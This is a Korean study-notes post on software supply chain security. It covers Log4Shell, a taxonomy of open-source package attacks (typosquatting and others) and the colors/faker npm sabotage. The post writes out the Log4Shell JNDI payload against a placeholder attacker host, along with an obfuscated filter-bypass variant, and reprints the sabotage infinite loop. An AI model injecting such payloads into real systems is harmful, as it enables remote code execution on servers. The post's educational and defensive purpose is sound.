---
title: "Software Supply Chain Security — 공급망 공격 구조와 Log4Shell 사례 정리"
date: 2026-06-13 00:00:00 +0900
categories: [Security, Software Security]
tags: [supply-chain, log4j, log4shell, cve, jndi, ldap, oss, typosquatting, npm]
---

## 1. Supply Chain의 기본 개념

**Supply Chain(공급망)** 은 원자재 획득부터 최종 제품을 소비자에게 전달하기까지의 전 과정에 관여하는 기업, 사람, 활동, 정보, 자원의 네트워크다.

전통적 공급망의 흐름:

```
Raw Materials → Supplier → Manufacturing → Distribution → Retail Location → Customer
```

---

## 2. Software Ecosystem에서의 Supply Chain

핵심 통찰: **현대 소프트웨어는 처음부터 직접 만들지 않는다(not built from scratch).** 수많은 open-source libraries와 frameworks에 의존하며, 이를 **dependencies(의존성)** 라고 부른다 (예: PyTorch, Numpy, Spring, React).

전통적 공급망에 대응되는 Software Supply Chain의 단계:

```
source/dependencies → build systems/engineers → network → application repository → deployed systems
```

---

## 3. Risk in the Software Supply Chain

빙산(iceberg) 비유로 설명되는 핵심:

- 사용자가 보는 "Your App"은 빙산의 일각일 뿐
- **Software suppliers의 60%가 high risk vulnerabilities를 포함**
- **Open source가 애플리케이션의 75%를 차지**
- 공격자들은 바로 이 보이지 않는 영역(open source, suppliers)을 노린다

### Inheritance of Vulnerabilities (취약점의 상속)

가장 중요한 구조적 개념이다. 내 앱은 수많은 open source에 의존하고, 그 open source들은 또 다른 open source / public image / base image에 의존한다. **의존성 사슬 깊숙한 곳(예: log4j)에 취약점이 하나 있으면, 그것이 연쇄적으로 상위로 전파되어 결국 "Your App"까지 감염된다.** 하나의 취약점이 전체 체인을 따라 상속되는 것이 핵심이다.

---

## 4. 대표 사례: Log4j / Log4Shell

### Log4j란?

- Apache Software Foundation이 개발한 **logging framework**로, 에러 메시지나 사용자 상호작용 같은 critical information을 기록하는 **logger** 역할
- Java/Scala/Kotlin 환경을 위한 **open-source software library**
- Microsoft, Apple, Netflix, Amazon 등 주요 기업 제품에 **널리 채택(widely adopted)** 됨 → 그래서 파급력이 컸음

### CVE-2021-44228 (Log4Shell)

**CVE(Common Vulnerabilities and Exposures)**: 공개된 보안 취약점에 부여되는 고유 식별자.

공격은 3단계(Phase)로 진행된다:

- **Phase 1 — Exploit Attempt**: 공격자가 victim website에 exploit 시도, Log4j가 이를 로깅
- **Phase 2 — Exploit Success**: External LDAP connection을 통해 attacker server에서 malicious script를 가져와 실행
- **Phase 3 — Actions on the Objective**: Post compromise(wget, curl 등) 이후 staging과 execution 2단계로 ransomware, cryptominer 등 실제 공격 수행

### 공격이 성립하는 메커니즘

이 공격을 이해하려면 세 가지 구성요소를 알아야 한다.

**(1) Log4j Logging의 정상 동작**

정상 시나리오에서 사용자가 HTTP request를 보내면 web server가 이를 로깅한다. 이때 User-Agent, URL, IP, Method 등 **사용자가 제어 가능한 입력값을 그대로 로그에 기록**한다는 점이 문제의 출발점이다.

**(2) JNDI (Java Naming and Directory Interface)**

- Java 애플리케이션이 **이름 조회(name lookup)** 를 통해 server나 database 같은 resource를 찾고 접근하게 해주는 시스템
- 리소스 위치를 직접 지정하는 대신, 이름만으로 JNDI에게 찾아달라고 요청
- LDAP directories, DNS servers, RMI servers 등 다양한 서비스에 연결 가능

```java
DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/MyDatabase");
// configured server에 연결하여 "MyDatabase"를 조회
```

**(3) LDAP (Lightweight Directory Access Protocol)**

- 네트워크를 통해 **directory services에 접근하고 관리**하는 프로토콜
- users, devices 등의 정보를 구조화된 **hierarchical format(계층 구조)** 로 저장·검색
- **Directory Information Tree (DIT)** 를 통한 data retrieval에 최적화(fast)
- 저장 대상: User information(username, email, position), Server name-IP 매핑, Group/permissions 등

**LDAP vs. Database 비교 (핵심 차이점)**

| 항목 | LDAP | Database (MySQL, PostgreSQL) |
|------|------|------|
| Main functions | Read / Fast Retrieval | CRUD (create, read, update, delete) |
| Structures | Tree Structure | Table Structure |
| Usages | User authentication, Organization map, Access control | 다양한 데이터 용도 |
| Optimizations | Read/retrieval에 최적화 | CRUD에 균형 |
| Return executable objects | **O (Java Reference)** | X |
| Transaction support | No or weak transaction | Strong transaction (ACID) |

여기서 **"LDAP은 executable objects(Java Reference)를 반환할 수 있다"** 는 점이 공격의 핵심 열쇠다.

**ACID** (Database의 강한 트랜잭션 속성):

- **Atomicity(원자성)**: 트랜잭션은 전부 완료되거나 전부 롤백되는 all-or-nothing
- **Consistency(일관성)**: 유효한 상태에서 또 다른 유효한 상태로, 데이터 무결성 유지
- **Isolation(고립성)**: 트랜잭션 간 간섭 불가, 중간 상태는 타 트랜잭션에 비가시
- **Durability(지속성)**: 커밋된 변경은 crash 후에도 영구 보존

### Log4j + JNDI + LDAP = 공격 완성

Log4j는 로그 메시지 안에서 **`${ }` syntax**를 사용해 **JNDI lookup**을 수행하는 것을 지원했다. 공격 진행:

```
1. 공격자가 ${jndi:ldap://attacker.com/a} 같은 문자열을
   로그에 기록되는 input field(예: User-Agent 헤더)에 주입(inject)
       ↓
2. Log4j가 그 문자열을 파싱하여 JNDI lookup을 시도
       ↓
3. 서버가 attacker's LDAP server에 연결
       ↓
4. LDAP server가 malicious Java object로 응답
       ↓
5. 취약한 서버가 그 객체를 자동으로 load and execute
       → Remote Code Execution (RCE)
```

### 대응책

| 방법 | 효과 |
|------|------|
| **Input validation(입력 검증)** | 우회 가능 — `${${lower:j}${upper:n}di:ldap://attacker.com/a}` 같은 변형으로 필터를 빠져나갈 수 있음 |
| **Web Application Firewall (WAF)** | 부분적으로 유효 |
| **Disable JNDI lookup** | **근본 원인 제거** — 가장 나은 해결책 |

### 피해 규모

- 발견 후 72시간 이내 누적 약 83만 건의 공격 시도
- 발견 4개월 후에도 90,000개 이상의 서버가 취약 버전을 인터넷에 노출
- Google 집계: Log4Shell 영향 패키지 17,840개 중 단 7,140개만 업데이트됨
- Maven Central에서 다운로드되는 Log4j의 **36%가 여전히 Log4Shell 포함**

### 취약점 확인 도구/DB

- **CVE (Common Vulnerabilities and Exposures)**: 공개 취약점에 고유 ID 부여하는 시스템 (cve.org, Log4Shell은 CVE-2021-44228)
- **NVD (National Vulnerability Database, nvd.nist.gov)**: scores, severity, impact, mitigation 등 보강된 정보 제공
- **exploit-db** (exploit-db.com): 실제 익스플로잇 코드 데이터베이스

---

## 5. SW Supply Chain Attacks

### Open-Source Software (OSS) Attacks 배경

- IEEE S&P 2023 논문 기반 (P. Ladisa et al., "SoK: Taxonomy of Attacks on Open-Source Software Supply Chains")
- 조직과 개인은 tech stack과 SDLC(software development lifecycle)의 모든 단계에서 **OSS에 크게 의존**
- Downstream users(하위 사용자)는 자신이 의존하는 프로젝트의 보안 관행에 대해 **통제권이 없고(lack control) 통찰도 제한적(limited insight)**

공격 방식의 핵심: 공격자는 open-source 프로젝트에 **악성 코드를 삽입(inserting malicious code)** 하여 공급망 공격을 일으킨다. 일단 오염되면 downstream user가 다운로드하여 설치 또는 런타임 중 실행하게 되며, 라이브러리부터 전체 애플리케이션까지 **어떤 유형의 프로젝트든 표적**이 될 수 있다.

### OSS Attack Taxonomy — 3가지 유형

#### (1) Develop and Advertise Distinct Malicious Package from Scratch

처음부터 악성 목적으로 **새 OSS 프로젝트를 만드는** 방식이다. 처음부터 또는 나중 시점에 악성 코드를 퍼뜨릴 의도로 생성한다. PyPI(pip), npm, Docker Hub, NuGet 같은 **package repositories/managers**가 표적이 된다.

#### (2) Create Name Confusion with Legitimate Package

정상 패키지와 **이름 혼동**을 유발한다. 정상 패키지와 비슷한 이름을 만들거나, 신뢰할 만한 작성자를 사칭하거나, 흔한 명명 패턴을 악용한다. **공격 비용이 매우 저렴(very cheap)** 한 것이 특징이다.

세부 기법:

| 기법 | 예시 |
|------|------|
| **Altering word order(단어 순서 변경)** | `test-vision-client` vs. `test-client-vision` |
| **Manipulating word separators(구분자 조작)** | `setup-tools` vs. `setuptools` |
| **Typosquatting(오타 악용)** | `django` vs. `dajngo` |
| **Similarity Attack(유사성)** | `requests` vs. `request` |
| **Brandjacking(브랜드 도용)** | `twilio-npm` |

#### (3) Subvert Legitimate Package

정상적인 기존 프로젝트를 **타락(corrupt)** 시키는 방식으로, contributor나 maintainer 같은 리소스 중 하나 이상을 장악해야 한다. 침투 지점에 따라 세분화된다:

- **Inject into Sources**: 프로젝트 codebase에 악성 코드 삽입. 모든 downstream user에 영향을 미쳐 **공격자에게 가장 큰 이득**. system user account 탈취, configuration software 취약점 악용 등의 방법을 사용한다.
- **Inject during the Build**: pre-built components(Maven, Gradle, DockerHub 등)를 다운로드하는 관행을 악용. codebase 주입보다 확산은 제한적이지만 **탐지가 더 어려움(detection more difficult)**.
- **Distribute Malicious Version**: pre-built components가 CDN(Content Delivery Networks)이나 proxy 캐시를 통해 미러링/배포되는 점을 악용. hosting/distribution/download 메커니즘 자체를 변조한다.
- **Dangling References(끊긴 참조 악용)**: 버려진(orphaned) 프로젝트의 resource identifier(이름이나 URL)를 재사용. Man-in-the-Middle attack, DNS cache poisoning, 클라이언트에서 정상 URL 변조 등을 포함한다.

---

## 6. 실제 인시던트: colors와 faker (npm)

### 배경 지식: npm

- **npm (Node Package Manager)**: JavaScript 런타임 Node.js의 기본 **package manager**
- pip처럼 **central registry**에서 재사용 가능한 코드 라이브러리(packages)를 설치/공유/관리
- 세계 최대 software registry (80만 개 이상 패키지)

### 사건 개요

- **colors**: 터미널/커맨드라인 텍스트에 색과 스타일을 추가하는 유틸리티
- **faker**: 테스트/개발용 가짜(mock) 데이터를 생성하는 유틸리티
- 둘 다 **Marak Squires** 개발·관리, 수천 개 패키지/앱이 dependency로 사용 (주당 약 2,000만 다운로드)

2022년 1월, 원작자 Marak Squires가 **자신의 패키지를 의도적으로 사보타주(intentionally sabotaged)** 했다:

- **colors**: `while(true)` 무한 루프로 `'LIBERTY LIBERTY LIBERTY'`를 끝없이 출력하도록 변경

```javascript
// "colors" package (ver 1.4.1)
const loop = () => {
  while (true) {
    console.log('LIBERTY LIBERTY LIBERTY');
  }
};
loop();
```

- **faker**: GitHub repo의 모든 소스코드를 삭제

### Impacts

- 해당 버전의 colors를 쓰는 Node.js 앱은 **freeze**되고 메시지를 무한 출력
- 전 세계 **수백만 개의 build와 CI/CD pipeline이 깨짐**
- version pinning이나 rollback을 적용하기 전에 일부 production system이 피해

> **Dependency (version) pinning**: 애플리케이션에서 특정(안정) 버전의 dependency를 고정하는 것 → 주요 방어책

동기(Marak의 주장): 대기업은 오픈소스로 이익을 보지만 기여자는 아무것도 얻지 못한다는 불만.

### 사건 교훈

- **유형**: Insider sabotage — maintainer가 직접 악성 코드 삽입
- **범위**: Global — 수백만 다운로드와 빌드에 영향
- **Lessons**:
  - 단일 maintainer에 대한 **과도한 의존(over-reliance on single maintainers)**
  - **dependency control(의존성 통제)의 부재**
  - **더 엄격한 신뢰 모델(stricter trust models)의 필요성**

---

## 전체 흐름 정리

```
개념
Supply Chain
    → Software Supply Chain (의존성에 기반한 생태계)
    → Inheritance of Vulnerabilities (취약점의 연쇄 상속)

Log4Shell 사례
Log4j logging + JNDI lookup + LDAP의 executable object 반환
    → ${jndi:ldap://attacker.com/a} 주입
    → 서버가 attacker LDAP에 연결
    → malicious Java object 반환 및 실행 (RCE)
대응: Input validation(우회 가능) < WAF < Disable JNDI lookup(근본 해결)

OSS Attack Taxonomy
① Distinct malicious package from scratch
② Name confusion (typosquatting 등, 공격 비용 매우 저렴)
③ Subvert legitimate package
    - Inject into Sources (최대 이득)
    - Inject during Build (탐지 어려움)
    - Distribute Malicious Version
    - Dangling References

실제 사례
colors·faker — Insider sabotage (maintainer 직접 사보타주)
→ 교훈: dependency pinning, 엄격한 신뢰 모델 필요
```

---

**Key Terms**

`Supply Chain` / `Dependencies` / `Inheritance of Vulnerabilities` / `Log4j` / `Log4Shell` / `CVE` / `NVD` / `JNDI` / `LDAP` / `DIT` / `ACID` / `RCE` / `Typosquatting` / `Brandjacking` / `Dangling References` / `Dependency Pinning` / `Insider Sabotage` / `Botnet-as-a-Service` / `OSS` / `SDLC` / `npm` / `package manager`
